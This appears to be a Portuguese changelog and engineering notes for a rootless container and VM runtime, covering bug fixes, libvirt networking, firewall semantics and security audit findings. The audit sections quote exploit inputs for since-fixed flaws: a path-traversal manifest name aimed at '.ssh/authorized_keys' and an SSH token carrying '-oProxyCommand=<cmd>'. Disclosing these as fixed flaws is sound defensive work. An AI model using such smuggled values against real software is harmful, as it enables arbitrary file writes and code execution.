### v0.32.1 — 3 achados durante o teste sistemático de todos os grupos de comandos

Continuação directa da revisão acima: testar ao vivo cada grupo/subcomando/parâmetro da CLI antes
da publicação (não só ler código) apanhou 3 problemas que a revisão estática não tinha visto.

1. **`secret create` não tinha via de stdin** — o próprio cheatsheet dos docs mostrava `printf
   's3nha' | delonix secret create db-pass` como forma seca de criar um segredo sem tocar no argv/
   histórico do shell, mas o comando só aceitava `--from-literal KEY=value`/`--from-env-file
   <ficheiro>` — o próprio exemplo documentado falhava com "segredo vazio". Corrigido:
   `--from-env-file -` lê de stdin (convenção `-`), mesmo parser `KEY=value` de um `.env` normal.
2. **`Error::NotFound` (partilhado por secrets/redes/volumes/imagens/...) dizia sempre "no such
   container: X"** — só `Store<Container>`'s dois call-sites dependiam da Display fixa; os outros
   stores já embutiam o prefixo certo na própria string. Um `secret rm <inexistente>` respondia
   literalmente "no such container: secret X". Corrigido na raiz (Display genérica `"no such
   {0}"` + os dois call-sites de `Store<Container>` a fornecer o prefixo deles) — validado ao vivo
   que `secret`/`volumes`/`network` passaram a nomear o recurso certo, e que `container
   rm`/`stop`/`net ingress ls` (via `firewall.rs`) não regrediram.
3. **`stack init` gerava um comentário desactualizado sobre `network:` em rootless** — dizia que
   tinha "uma limitação CONHECIDA... só funciona como root", uma nota de uma versão anterior a
   `reexec_into_netns` (ver secção "CLI" acima) ter fechado esse problema. Confirmado ao vivo
   (`container apply` com `network: <rede>` ganha IP real em rootless) e o comentário do scaffold
   corrigido para reflectir o estado actual — `--net host` continua o default do scaffold só por
   simplicidade, não porque `network:` esteja limitado.

### v0.32.2 — 380+ strings PT hardcoded fora do catálogo i18n, em 26 ficheiros

O achado nº2 acima (`manifest.rs`) era só a ponta: uma varredura completa (agentes em paralelo +
2ª passagem manual) encontrou a MESMA classe de bug — texto português hardcoded, visível mesmo em
EN por omissão — em `crates/delonix-runtime-bin/src/cmd/{build,cluster,conditions,container,
dependency,etcd,firewall,httproute,image,ingress_proxy,kindmode,kube,lb,manifest,mapped,network,
scaffold,scan,secret,sharevolume,stack,storage,system,tunnel,vm,vmimage,volume}.rs` — 380 strings
ao todo, movidas para `po::t`/`po::tf` + `pt.po` (352+ entradas novas). Duas armadilhas de
concordância de género apanhadas antes de corromper o catálogo (a mesma chave EN "created" já
existia traduzida como *criada* para "a rede" — reaproveitá-la para "o volume" teria produzido
*criada:* onde devia ser *criado:*; resolvido com chaves distintas por contexto, nunca partilhando
um `msgid` cujo `msgstr` dependa do género do sujeito). Aproveitado para corrigir 3 páginas da
doc pública desactualizadas (`docs/gen.py`): `serve docker-api` descrito como só-leitura (é
lifecycle completo desde v0.26.0), `cluster kubeadm` descrito sem suporte a HA (o HAProxy
automático existe desde v0.13.0), `network` descrito como só `bridge` realizado fisicamente (o
`overlay` também é, há várias versões) — e uma página inteira em falta (`delonix compose`, zero
documentação desde a v0.29.0). Validado ao vivo: build/clippy/fmt/test limpos, EN por omissão +
PT exacto via `--l18n=pt` em várias amostras, incluindo alinhamento de colunas independente por
língua no `volumes inspect`.

## Falhas silenciosas corrigidas (fail-closed) + 1 documentada

Da análise Docker/Podman (`docs/COMPARACAO-DOCKER-PODMAN.md`), quatro casos em
que uma opção era ACEITE e depois IGNORADA — pior que uma feature em falta,
porque o utilizador julga estar protegido. Três corrigidos para fail-closed
(erro/aviso explícito, alinhado ao invariante "sem falha silenciosa"):

1. **`--security-opt seccomp=<perfil.json>`** — perfil custom era ignorado (o
   container corria com o allowlist embutido). Passa a ERRO explícito: só
   `seccomp=unconfined` é suportado; perfis custom não estão implementados.
2. **`-v host:/dst:z|:Z|:U|<propagação>`** — o 3.º campo só reconhecia `ro`; as
   opções SELinux eram ignoradas e o bind falhava em RHEL/Fedora enforcing.
   Passa a ERRO: só `:ro`/`:rw` suportados (`resolve_spec`).
3. **`--network-alias`** — gravado mas o `dns_resolve` nunca o consultava.
   Passa a AVISO no `run` (implementar a resolução por alias é follow-up).

4. **`cpuset`/`cpu.weight`/`io.weight` no cgroup rootless-delegado** — `try_delegated_base`
   (`crates/delonix-runtime/src/lib.rs`) já activava `+cpuset`/`+io` no
   `subtree_control` da base delegada, mas nunca ESCREVIA `cpuset.cpus`/
   `cpu.weight`/`io.weight` na leaf — só `memory.max`/`pids.max`/`cpu.max`. O
   caminho não-delegado (root) já aplicava os três correctamente; o delegado
   (o modo NORMAL em rootless) não. **Corrigido**: os mesmos três `fs::write`
   best-effort do caminho root, agora também na leaf delegada. **Validado ao
   vivo neste host** (kaeso-sys-01, sessão sob `user@1000.service`): um
   `container run --cpu-weight 500` real confirmou `cpu.weight=500` na leaf
   real em `/sys/fs/cgroup/.../dlx-containers/dlx-<id>/cpu.weight` (o
   controlador `cpu` está delegado aqui). `cpuset`/`io` continuam por
   confirmar num host onde esses dois controladores estejam efectivamente
   delegados — **confirmado que este host NÃO os delega** (`systemd-run
   --user --scope -p Delegate=cpuset` só devolve `cpu memory pids`, mesmo
   pedindo `cpuset` explicitamente — limite do próprio `user@.service` da
   distro, não do código do delonix); o código escreve os ficheiros na
   mesma, best-effort, exactamente como o caminho root já fazia — sem
   controlador delegado o kernel simplesmente não cria `cpuset.cpus`/
   `io.weight` na leaf, e o `fs::write` falha silenciosamente aí (mesmo
   comportamento aceite no caminho root para o mesmo cenário). Teste de
   regressão puro (sem cgroupfs real): `try_delegated_base_aplica_cpu_weight_
   cpuset_e_io_weight_na_leaf`.
5. **`container update --memory/--cpus`** — **FEITO**. A função `runtime::
   update_limits` já existia no motor (rótulo próprio "`docker update`" no
   doc-comment) mas nunca tinha um único chamador — exactamente o mesmo padrão
   já visto com `mount_live`/`set_net_rate`: código morto por chamar, com um
   bug latente que só apareceu ao ligar o primeiro caller. **BUG ENCONTRADO E
   CORRIGIDO ao ligar isto**: `update_limits` calculava o cgroup por
   `container.cgroup()` — a fórmula ESTÁTICA `delonix.slice/delonix-<id>`, só
   válida em modo root. Em rootless delegado (o caminho normal), o cgroup real
   vive algures como `.../dlx-containers/dlx-<id>` (descoberto em runtime via
   `/proc/<pid>/cgroup`) — exactamente a razão de existir de `live_cgroup()`
   (já usada por `set_frozen`/`is_frozen` do `pause`/`unpause`), que
   `update_limits` simplesmente não usava. Resultado antes do fix: o comando
   dizia "actualizado", o registo mudava, mas o cgroup REAL do container a
   correr ficava intocado — só um `restart` (que recria o cgroup a partir do
   registo) aplicava o novo limite. Corrigido trocando `container.cgroup()`
   por `live_cgroup(container)` em `update_limits`. **Validado ao vivo**: `-m
   64M --cpus 0.5` → `update --memory 128M --cpus 1.0` → `memory.max`/`cpu.max`
   do cgroup REAL (sem `restart`) confirmam `134217728`/`100000 100000` de
   imediato. Sem teste unitário puro (ao contrário do fix irmão de cpuset/
   cpu.weight/io.weight): `DELONIX_SLICE` é uma constante de caminho absoluto,
   não injectável como o `base` de `try_delegated_base`, e `live_cgroup` lê
   `/proc/<pid>/cgroup` de um processo real — validação ao vivo é a prova
   disponível aqui, mesmo padrão já aceite noutras correcções de fronteira de
   cgroup/namespace nesta base de código.

## Auditoria de segurança #2 (código VM desta série: console/rede/cloud-init)

Skill `delonix-runtime-sec` corrida sobre a superfície NOVA das v0.7.x (VM
console/vnc, firmware/backend automáticos, rede libvirt, cloud-init user-data,
instalador). O container `run` está limpo (id gerado + `safe_key`); a VM era a
excepção porque os caminhos auxiliares usavam o nome CRU.

**Achado ALTO — CORRIGIDO — path traversal via nome da VM.** O nome (do CLI OU
de `metadata.name` de um manifesto NÃO-confiado via `stack apply -f`) fluía cru
para `state_root/vms/<name>` (`generate_seed_iso`) e para o overlay
`<name>.qcow2` — um `metadata.name: "../../.ssh/authorized_keys"` escrevia/
sobrescrevia ficheiros FORA do directório de estado, como o utilizador
(arbitrary file write conduzido por manifesto). O `JsonStore` já sanitizava o
`.json` (`safe_key`), mas os caminhos de seed/overlay/sock não. **Fix**:
`delonix_vm::valid_vm_name` (whitelist `[A-Za-z0-9._-]`, sem `..`/`/`/`-`
inicial/controlo) chamada no topo de `delonix_vm::create` — o boundary do
motor, por isso qualquer consumidor da API herda. Fecha de uma vez os 3
vectores do nome: traversal, argv do `virsh`, e injecção no YAML do cloud-init
(o nome vira `hostname`). Teste `valid_vm_name_recusa_exploits`.

**Achado BAIXO — CORRIGIDO — argv do `virsh` sem `--`.** `virsh -c uri console/
start/destroy/domstate/... <name>` sem `--`: um nome começado por `-` seria lido
como opção. Coberto já pela `valid_vm_name`, mas acrescentou-se `--` antes do
nome/rede em todos os argv `virsh` (defesa em profundidade, mesmo padrão do
`ssh`/`scp` da auditoria #1).

**Achado MÉDIO — CORRIGIDO — ficheiro temp previsível (rede libvirt).**
`ensure_libvirt_network` escrevia o XML da rede em `/tmp/delonix-libvirt-
default-<pid>.xml` (nome previsível, world-writable) com `fs::write` — outro
utilizador local podia pré-criar um symlink e desviar a escrita. **Fix**:
`OpenOptions::create_new` (O_EXCL, não segue symlinks) + `mode(0o600)`.

**Achado MÉDIO — DOCUMENTADO — downloads do instalador sem checksum.** O
`install.sh` verifica o binário `delonix` contra o `SHA256SUMS`, mas o
`cloud-hypervisor-static` e o `hypervisor-fw` (upstreams oficiais) são
instalados só com HTTPS, sem verificação de hash — o upstream não publica
checksums num formato conveniente. MITM mitigado por TLS; um upstream
comprometido ou TLS-stripping passaria. Aceite como risco documentado (mesma
natureza do cloud-hypervisor que já se instalava assim); fechar exigiria os
upstreams publicarem/pinar-se um digest.

## Auditoria E2E ampla (14 finders × verificação adversarial) — estado

Auditoria ofensiva de todo o ecossistema (~50k LOC, 9 crates: bugs/gaps/design/
performance/concorrência/memória/recursos), 14 finders por subsistema, cada
achado passado por 2 céticos adversariais. **Relatório completo em
[docs/AUDITORIA-E2E.md](docs/AUDITORIA-E2E.md)** — 24 achados confirmados (6 HIGH,
12 MEDIUM, 6 LOW) + 11 por-verificar nessa corrida original.

**Os 6 HIGH foram CORRIGIDOS no v0.9.0** (path traversal em whiteouts OCI via
`safe_rel`+confinamento canonicalizado; IDs de CRI via `valid_cri_id`+`remove_rec`;
nome de VM em `generate_seed_iso` via `valid_vm_name` na origem; kubeconfig via
`sudo cat` para stdout do SSH, nunca toca em disco remoto; `COPY` do build via
`confine_to` (canonicaliza + confere `starts_with`); socket de gestão via
`SO_PEERCRED`+modo 0600, espelhado no `delonix-cri`) — **re-verificados ao vivo
numa 2.ª sessão (2026-07-23), código actual lido linha a linha, os 6 continuam
corrigidos**, sem regressão. **Auditoria adversarial INDEPENDENTE genuína feita
em 2026-07-26** (a sessão de 2026-07-23 releu o próprio código, mas não era um
2º par de olhos externo tentando activamente reconstruir cada exploit): 5/6
confirmados sólidos ao tentar reproduzir o exploit original; o kubeconfig
tinha um **TOCTOU residual real** (não hipotético) — `fs::write` cria o
ficheiro no modo do umask (664 medido ao vivo neste host) e só DEPOIS aplica
`chmod 600`, uma janela em que outro utilizador local podia ler as
credenciais cluster-admin. **Corrigido**: `OpenOptions::mode(0o600)` define o
modo ATOMICAMENTE na criação (`cmd/cluster.rs::fetch_kubeconfig`), o mesmo
padrão que `ensure_libvirt_network` já usa — ver
`docs/COMPARACAO-DOCKER-PODMAN.md` secção 1a/1b para o relatório completo.

**Dos outros 29 (12 MEDIUM + 6 LOW confirmados + 11 por-verificar), 27 continuam
em aberto** — re-confirmados na mesma sessão (nenhum foi refutado, nenhum
parcialmente corrigido); ver o relatório completo para detalhe/correcção de cada
um. Os 2 "por-verificar" de maior severidade da corrida original **já estão
CONFIRMADOS CORRIGIDOS** (o `AUDITORIA-E2E.md` ainda os lista como abertos por
lapso — `docs/COMPARACAO-DOCKER-PODMAN.md` tem o detalhe de cada um): fuga de
rootfs no `--rm` rootless (`container.rs`, ambos os ramos foreground/watcher já
chamam `remove_container_dir`, desde o commit `7bde467`/v0.19.0) e o `egress`
global que apagava regras per-network por correspondência de substring demasiado
ampla (`infra.rs:1531`, `is_global_egress_drop_line` já exclui linhas com
`iifname`, confirmado na 2ª ronda — ver secção 1b do `COMPARACAO-DOCKER-PODMAN.md`).

### 2.ª ronda (2026-07-23) — 4 auditorias em paralelo, 2 CRITICAL + 3 HIGH novos, CORRIGIDOS no v0.10.1

Pedida uma revisão completa (bugs/gaps/design/arquitectura, não só segurança).
Além de re-verificar os 35 achados acima, 3 auditorias frescas: `delonix-runtime/
lib.rs` (104 `unsafe`, NUNCA antes auditado), `delonix-net/infra.rs` (holder/
control-socket), e todo o código desta MESMA sessão anterior (Tunnel, ShareVolume,
`cluster.rs`, specs agrupados) — código com zero revisão prévia. 2 CRITICAL + 3
HIGH, **todos já em produção no v0.10.0**, corrigidos de imediato (ver
[docs/releases/v0.10.1.md](docs/releases/v0.10.1.md) para o detalhe completo).
**Confirmado de forma independente em 2026-07-26**: uma auditoria adversarial
fresca sobre estes DOIS mesmos ficheiros (mapeamento uid/gid, seccomp/`clone3`,
`safe_bind_target`, eBPF do device-cgroup, higiene de fd em todos os forks,
`SO_PEERCRED` em todo o dispatch do socket de controlo) não encontrou nenhum
achado novo CRITICAL/HIGH — ver `docs/COMPARACAO-DOCKER-PODMAN.md` secção 1b
para o relatório completo. Os achados originais desta ronda:

1. **`kind: ShareVolume` com `name: ".."` escapava para o Storage pai inteiro** —
   `VolumeStore::valid_name` aceitava um nome só de `.` (`".."` passava no
   charset); `sharevolume rm --purge-data` nesse nome apagava o NAS partilhado
   inteiro. Corrigido no `valid_name` (recusa `.`-prefixo/`..`), protege todos os
   consumidores do store.
2. **Injecção de argv SSH via token do `kind: Tunnel`** — o token do pinggy ia
   sem `--` como último argumento posicional do `ssh`; um token
   `-oProxyCommand=<cmd>` era lido como opção → RCE local. Corrigido em
   `resolve_token` (recusa `-` inicial) + `--` no argv.
3. **Nomes de container nunca validados** — `container run --name
   registry.npmjs.org` (sem privilégio) sequestrava a resolução DNS desse
   hostname para TODO o nó, em qualquer namespace. Corrigido com
   `valid_container_name` (exclui `.` deliberadamente, ao contrário do
   `valid_vm_name`).
4. **`cluster kubeadm --copy-kubeconfig` confiava no `admin.conf` remoto por
   inteiro** — um `users[].user.exec` legal vira RCE local no operador se o
   control-plane for comprometido depois do provisionamento. Corrigido:
   `safe_cluster_entry`/`safe_user_entry` constroem entradas novas só com os
   campos que o `admin.conf` real do kubeadm tem.
5. **Bind-mounts seguiam symlinks plantados pela imagem, antes do `pivot_root`**
   — `mount_target_safe` só lexical; a imagem podia redireccionar
   `create_dir_all`/`open` para qualquer caminho real do host. Corrigido com
   `safe_bind_target` (resolve componente a componente, recusa symlinks) — o
   equivalente, do lado do motor, ao `confine_to` do build.

Todos validados ao vivo contra o exploit real, não só testes unitários (ver o
histórico de commits `4c3e223`/`456925f`). Achado #3 acima é uma escalada do
achado "por-verificar" MEDIUM de DNS hijack da corrida original (o CLI directo,
sem manifesto nenhum, já bastava).

## Ciclo de vida VM no libvirt (`vm stop/rm`) — managed save, órfãos, `--force`

Bug report real (host kaeso-sys-01): `vm rm dev` vazava o stderr cru do `virsh`
("Failed to destroy… not running" + "Refusing to undefine while domain managed
save image exists"), apagava o registo local NA MESMA e deixava o domínio
**órfão** no libvirt; o `vm stop` seguinte respondia "no such container" (o
substantivo errado). Corrigido em `delonix-vm` (`libvirt_cleanup`/`quiet`/
`libvirt_poweroff`/`libvirt_domain_uri`) + `cmd/vm.rs`:

- **`undefine` leva sempre `--managed-save --snapshots-metadata --nvram`**
  (fallback para o simples em virsh antigo) — era a causa-raiz da recusa; o
  `destroy` só corre se o domínio NÃO estiver "shut off". Nada do `virsh` vaza
  cru: `quiet()` captura stdout+stderr e compõe a mensagem (sem o prefixo
  `error: ` do virsh).
- **`VmBackend::stop` devolve `Result`** e o `rm` **preserva o registo local se
  a limpeza no backend falhar** (erro claro + hint); `vm rm -f/--force`
  descarta o estado local na mesma. Sem órfãos silenciosos em nenhum sentido:
  `rm`/`stop` também reconhecem um domínio libvirt SEM registo local (órfão de
  antes do fix) e limpam-no/desligam-no.
- **`Error::VmNotFound`** ("no such VM: … (see `delonix vm ls`)") em
  `stop`/`remove`/`status` — o `NotFound` partilhado diz "no such container".
  Armadilha a reter: **`JsonStore::remove` é idempotente** (ausência = Ok),
  por isso o "não existia" tem de se decidir ANTES (flag `existed`), não pelo
  retorno do `st.remove`. `vm rm <inexistente>` agora é erro, como no docker.
- Aliases: `vm down` = `stop`, `vm delete` = `rm`. Testes:
  `quiet_captura_o_stderr_sem_o_prefixo_error`,
  `stop_e_remove_de_vm_inexistente_dizem_no_such_vm`. Validado ao vivo: o
  órfão `dev` real (shut off + managed save) foi removido em silêncio.

### `vm console` preso em "Active console session exists" (v0.11.1)

Bug report real (host kaeso-sys-01): depois de um `vm console` terminar de
forma não limpa (SSH caída, Ctrl-C a atingir o `virsh` em primeiro plano,
terminal fechado), o libvirt continua a achar que há uma sessão de consola
ligada a esse domínio — toda a tentativa seguinte de `vm console` na MESMA VM
falha para sempre com `error: operation failed: Active console session exists
for this domain`, sem saída a não ser reiniciar o `libvirtd` do host.
**Corrigido**: `--force` no `virsh console` (`cmd_console`, `cmd/vm.rs`) — a
flag existe exactamente para isto ("disconnect already connected sessions").
Como `vm console <nome>` é um comando de um único operador, uma sessão presa
da tua PRÓPRIA ligação anterior é o caso esmagadoramente comum, não um
segundo espectador real a proteger.

### `vm start`/`vm restart` (v0.12.0) — trazer de volta uma VM parada, sem redigitar as flags

Bug report real (o mesmo `dev` do achado acima): depois de o `vm console`
finalmente destrancar, o domínio afinal já estava mesmo `Stopped` (motivo fora
do alcance do delonix — ver secção anterior). A única forma de voltar a
arrancá-la era `delonix vm create dev` de novo, que É idempotente/auto-heal
(reaproveita o overlay), mas **exige as MESMAS flags** (`--vcpus`/`--memory`/
`--disk`/etc.) — sem elas, o "auto-heal" arrancaria com os defaults do clap
(1 vCPU, 1G), silenciosamente diferente da VM original. `vm start`/`vm
restart` (`delonix_vm::{start,restart}`, `crates/delonix-vm/src/lib.rs`)
resolvem isto: reconstroem a `VmConfig` a partir do PRÓPRIO registo persistido
(`config_from`) — disco base, vcpus, memória, rede, backend, `restart_policy`,
`devices`, e (só libvirt) o net mode, que `LibvirtBackend::boot` já guardava
disfarçado no campo `Vm.tap` (`cfg.net_mode.unwrap_or("user")`) — e delegam no
mesmo `create`/auto-heal de sempre.

**Limitação honesta, documentada no próprio `--help`**: o registo `Vm` nunca
persistiu tudo o que a `VmConfig` completa tem — kernel/initrd/firmware/
cmdline de boot directo, seed de cloud-init próprio, volumes 9p, IP estático,
VNC, e os campos avançados de libvirt (machine/cpu model/topology/TPM/video/
boot order/discos ou NICs extra/XML cru) só existiram como flags do `vm
create` e morrem depois de ele terminar. Uma VM que precise de algum destes
tem de voltar pelo `vm create` original (também idempotente) — `start`/
`restart` cobrem o caso comum (imagem dourada, sem flags avançadas), não
substituem `create` para o resto. `vm start` é idempotente (já a correr = sem
efeito, delega no `create`); `vm restart` força sempre um reboot real (pára
primeiro se estiver a correr).

## Rede das VMs libvirt — default `nat` com IP, `--ip` estático, rotas VM↔container

Bug report real: `vm create dev` mostrava `IP <none>` para sempre — sem
`--net-mode` e rootless, o backend libvirt caía em `qemu:///session` user-mode
(SLIRP), cujo IP é invisível ao `domifaddr` e inalcançável. Corrigido:

- **Default inteligente** (`LibvirtBackend::boot`): sem `--net-mode`, se a
  conexão de SISTEMA é utilizável (`system_libvirt_usable`, grupo `libvirt`),
  o modo efectivo passa a **`nat`** → IP por DHCP da rede libvirt, visível e
  alcançável. Só sem acesso ao system fica user-mode, e o `create` AVISA alto
  ("no reachable IP — join the `libvirt` group…"). `Vm.tap` passou a registar o
  **modo efectivo** (`nat`/`bridge`/`user`) — é o que o `wait_for_boot` usa
  para distinguir "esperar o lease DHCP" de "nunca vai ter IP" (antes desistia
  aos 3s para QUALQUER VM libvirt, mesmo nat a meio do boot).
- **`--ip <estático>`** (`vm create` + `spec.ip` no manifesto): reserva DHCP
  MAC→IP na rede libvirt (`virsh net-update … ip-dhcp-host`, `libvirt_reserve_ip`,
  idempotente add-last→modify). Só modo nat; noutros modos erro claro. Armadilha
  de argv: os flags `--live --config` têm de vir ANTES do `--` (depois viram
  dados posicionais). **Limitação**: `vm rm` ainda não remove a reserva.
- **`<backingStore>` explícito no XML do domínio**: o perfil AppArmor
  por-domínio (virt-aa-helper, Ubuntu) só whitelista caminhos presentes no XML
  — sem ele o QEMU abria o overlay mas levava EPERM no qcow2 base
  ("Could not open …vm-images/…: Permission denied"). Formato via
  `disk_backing_format` (nunca pela extensão).
- **DNS interno**: `dns_resolve` agora resolve VMs pelo **IP do registo**
  primeiro (uma VM nat/bridge vive na virbr0 do HOST — o MAC nunca aparece na
  neigh do holder, único mecanismo anterior), com neigh como fallback (CH).
  `delonix_vm::status` **persiste** o IP recém-aprendido (o lease DHCP chega
  muito depois do create). NOTA: o DNS corre no processo do holder — binário
  antigo só apanha isto num respawn do holder (não forçar num host com
  containers vivos).
- **Matriz de alcançabilidade validada ao vivo** (kaeso-sys-01, VM nat
  192.168.122.x + containers SDN 10.210.x): **container→VM funciona
  nativamente** (container → holder → slirp → stack do host → virbr0; provado
  com banner SSH recebido de dentro do kaeso-odoo) e as regras de EGRESS
  por-container governam-no (daddr CIDR). **VM→container**: por porta publicada
  ligada ao gateway da rede da VM, ou pelo proxy L7. IPs de container DIRECTOS
  são inalcançáveis de fora do netns do holder (NAT do slirp) — juntar as duas
  casas (virbr0 do host ↔ SDN no netns do holder) exige `CAP_NET_ADMIN` no
  init-netns do host (um veth+rotas privilegiado), fora do modelo rootless;
  trabalho futuro opt-in (`delonixd`), NÃO um toggle (o `delonix0` não é bridge
  de host — confirmado). VM↔VM na mesma rede nat: directo pela virbr0. IP do
  ingress (SDN) para VM = backend Cloud Hypervisor (tap no holder, MESMA SDN dos
  containers → alcança-os por IP directo; provado por construção, mas a golden
  image k8s só arranca em libvirt, não em CH).

### `delonix vm reach` — descoberta VM→container (sem dataplane novo)

O caminho VM→container por **porta publicada** só funciona se o bind for um
endereço que a VM roteia — o **gateway da rede libvirt** (ex.: `192.168.122.1`),
não o loopback (o default SEGURO, que faz o VM→container falhar em silêncio com
"connection refused"). O mecanismo já existia (`DELONIX_PUBLISH_ADDR=<gw>` no
`slirp_add_hostfwd`, IPv4 validado); ligar ao gateway do libvirt expõe às VMs
dessa rede **mas não à LAN externa** (192.168.122/24 é NAT). **Provado E2E**: de
dentro de uma VM (`ubuntu@192.168.122.50`), `curl 192.168.122.1:<porta>` →
HTTP 200 para um container na SDN; o loopback-bound recusa, como esperado.

`delonix vm reach` (`cmd/vm.rs`, `cmd_reach`) torna isto descobrível: lista os
gateways `virbr*` (`parse_ip_gateways`), lê o bind VIVO de cada porta publicada
via `ss -tlnH` (`parse_ss_binds` — o bind NÃO está no registo, veio do env var
no publish), e separa "alcançáveis a partir de VMs" (endereço:porta) dos
"loopback-only" (com o comando exacto de correção: `unpublish` + republish com
`DELONIX_PUBLISH_ADDR=<gw>`). Read-only, zero privilégio, zero mudança ao default
seguro. Parsers puros e testados (`parse_ip_gateways_pega_so_as_virbr`,
`parse_ss_binds_classifica_loopback_vs_gateway`).

## VM↔container por IP directo (`vm bridge`) — EXPERIMENTAL, privilegiado, opt-in

A ÚNICA coisa que o modelo rootless não faz sozinho: dar a uma VM libvirt (em
`virbr0`, netns do host) alcançabilidade DIRECTA aos IPs de container da SDN
(`delonix0`/`dlxn…`, dentro do netns do holder `unshare --user --net`). Fechar a
fronteira exige `CAP_NET_ADMIN` no init-netns do host, logo `vm bridge` **precisa
de root** — é a excepção deliberada ao daemonless-rootless, atrás de `--apply`
(default = DRY-RUN que só imprime o plano). Módulo `cmd/vmbridge.rs`.

- **Mecanismo** (`bridge_plan`, puro/testado): veth par no host → move a ponta SDN
  para o netns do holder + enslave à bridge da rede → ponta host ganha
  `<prefix>.255.254/16` → `ip_forward=1` → rota de retorno `<vm-subnet> via
  <host-ip>` DENTRO do holder. Sem SNAT: o container vê o IP real da VM, e o
  firewall por-container continua a governar (um IP de VM não está em `@dlxall`,
  passa como gateway; regras `ingress` explícitas aplicam-se na mesma).
- **Segurança**: abre VM↔container só na rede indicada; a subnet da VM é a NAT do
  libvirt (`192.168.122.0/24`), NÃO a LAN externa. `vm unbridge <rede>` desfaz.
- **Robustez**: regras `iptables -I FORWARD` ACCEPT nos dois sentidos
  (`<vm-subnet>↔<sdn>/16`) contra o REJECT default do libvirt; establish
  IDEMPOTENTE (limpa um veth órfão antes de criar, p.ex. após respawn do holder).
- **VALIDADO E2E ao vivo** (kaeso-sys-01, 2026-07-21): de DENTRO de uma VM libvirt
  (`ubuntu@192.168.122.50`) → `ping`/`curl` a um container da `kaeso-net` por IP
  DIRECTO (`10.210.37.150:8069` → HTTP 200, ttl=63 = uma hop pelo forward do
  host). O `unbridge` limpa tudo. Três bugs reais apanhados no host e corrigidos:
  (1) sob sudo resolvia o state do root, não do utilizador (`adopt_invoking_user_root`
  via `$SUDO_USER`); (2) `nsenter -U -n` largava as caps → EPERM no enslave, tem
  de ser `-n` só (root mantém o CAP_NET_ADMIN do init-userns sobre o netns do
  userns descendente); (3) IPs de container são dinâmicos (DHCP, mudam no restart).
- **Follow-ups**: persistência (re-aplicar num respawn do holder) e **descoberta
  por NOME** (a VM resolver `<c>.<ns>.delonix.internal` via o DNS do holder, para
  não depender de IPs dinâmicos) — a fatia que dá o valor real. Complementa o
  `vm reach` (via porta publicada, sem privilégio) para quem precisa do IP 10.x cru.

## Firewall `ingress`/`egress` — o último comando ganha (+ `rm` cirúrgico)

Bug report real: `ingress deny <c> 8069` seguido de `ingress allow <c> 8069`
deixava o serviço bloqueado PARA SEMPRE — as regras acumulavam no `ContainerFw`
e a chain nft é first-match terminal, logo o deny antigo (acima) ganhava. Fixado
em `cmd/firewall.rs::add_rule` (semântica ufw): uma regra nova para o MESMO
match (dir/proto/porta/origem, com `""`≡`0.0.0.0/0`≡`*` via `norm_any`)
**substitui** a existente, com nota no output. Para sobreposições parciais (ex.:
`deny any/8069` vs `allow tcp/8069`, matches distintos) um **aviso de sombra**
(`field_overlaps`) explica que a regra anterior continua a casar primeiro e diz
o comando para a tirar. Novo **`ingress|egress rm <c> <[proto/]porta> [--from/
--to]`** — remoção cirúrgica em que os coringas do spec são FILTRO (`rm c 8069`
tira tcp/udp/any dessa porta); complementa o `clear` (tudo-ou-nada) e segue a
sua regra de "firewall vazia desaparece por inteiro". Também corrigido:
`ingress unpublish` num container PARADO sem rede custom — o hostfwd vive no
slirp por-container, que morreu com ele; limpa-se só o registo (antes: erro
"container is not running" e o publish ficava preso). Validado E2E ao vivo
(deny→000, allow→200 com substituição, rm→limpo). Nota: um `ingress -h` vazio
reportado uma vez NÃO reproduziu (3× OK) — glitch de terminal, sem causa no CLI.

### Revisão do flow `-p` ↔ `ingress`/`egress` (2026-07-27) — 1 bug de SEGURANÇA + 3 de coerência

Bug report real do utilizador: "o browser não deve bloquear quando o container é exposto via `-p`".
A investigação partiu do sintoma e acabou noutro sítio — o sintoma era real, mas o achado grave
estava ao lado. Os quatro problemas partilham a mesma raiz conceptual: **`-p` (publish) e
`ingress`/`egress` (firewall) são dois planos independentes que ninguém reconciliava**, nem no
dataplane nem no que a CLI dizia ao utilizador.

1. **CRÍTICO (segurança) — a PORTA era silenciosamente ignorada quando o proto era `any`.**
   `fw_chain_body` (`delonix-net/src/infra.rs`) só emitia o `dport` DENTRO do ramo
   `proto != "any"`. Como `parse_port_spec` faz `proto` cair em `any` sempre que o utilizador
   escreve uma porta nua (`allow <c> 9999`, a forma esmagadoramente comum), a regra gerada era
   `ip daddr <ip> accept` — **o container inteiro**, não a porta pedida. Consequência medida ao
   vivo, não teórica: com `policy deny`, um `ingress allow <c> 9999` (porta sem relação nenhuma)
   ABRIU a porta 18099 publicada; com `policy allow`, um `ingress deny <c> 9999` FECHOU-a. O
   comando fazia o oposto do que dizia, exactamente onde estar errado é um buraco de segurança.
   Com proto explícito (`tcp/9999`) sempre funcionou — é por isso que nunca apareceu nos testes
   E2E anteriores, que usam a forma com proto. **Corrigido**: `any` + porta passa a emitir
   `meta l4proto { tcp, udp } th dport <porta>` (`th` = transport header, válido para os dois,
   ranges `n-m` incluídos — o `fw_port_ok` já os valida). Regressão em
   `fw_body_keeps_the_port_when_proto_is_any`. **Provado por teste unitário, NÃO ao vivo**:
   `fw_chain_body` corre dentro do processo do HOLDER, e este host tem containers vivos (odoo,
   registries, control-planes k8s) — respawnar o holder derrubaria a SDN de todos (mesma nota
   já registada para o DNS interno). Só apanha o fix num respawn do holder.
2. **`ingress ls` mentia sobre as portas publicadas.** A tabela imprimia sempre
   `publish <spec> 0.0.0.0/0 allow DNAT`, incondicionalmente. Reproduzido ao vivo: com
   `policy deny`, `curl` dava `000` e a tabela continuava a dizer `allow` — na coluna que se lê
   precisamente para decidir se algo está exposto. **Corrigido** com `published_verdict`, que
   resolve o veredicto como o dataplane o resolve, e imprime `BLOCKED` + o comando exacto de
   recuperação. `set_policy` ganhou o mesmo aviso no momento em que o `deny` é aplicado.
3. **A porta que uma regra tem de nomear é a do CONTAINER, nunca a do host** — o DNAT corre no
   `prerouting`, logo quando o pacote chega à chain por-container o `dport` já é o `cp` de
   `hp:cp`. Não estava documentado em lado nenhum e é contra-intuitivo (o `ls` mostra `18099:80`,
   a regra tem de dizer `80`). Antes do fix #1 isto nem se notava: com `proto: any` a regra
   ignorava a porta e "funcionava" por acidente, pela razão errada. Agora as mensagens de aviso
   dizem-no explicitamente.
4. **`net ingress ls` listava containers que a firewall provavelmente não governa.** Um
   `--net host`/`none` aparecia com `allow (default)`, que se lê como "governado e aberto",
   quando `require_sdn_ip` recusa QUALQUER mutação de firewall para ele (`ingress allow
   mandume-benguela-02 80` → erro). Passou a `n/a (host net)`.

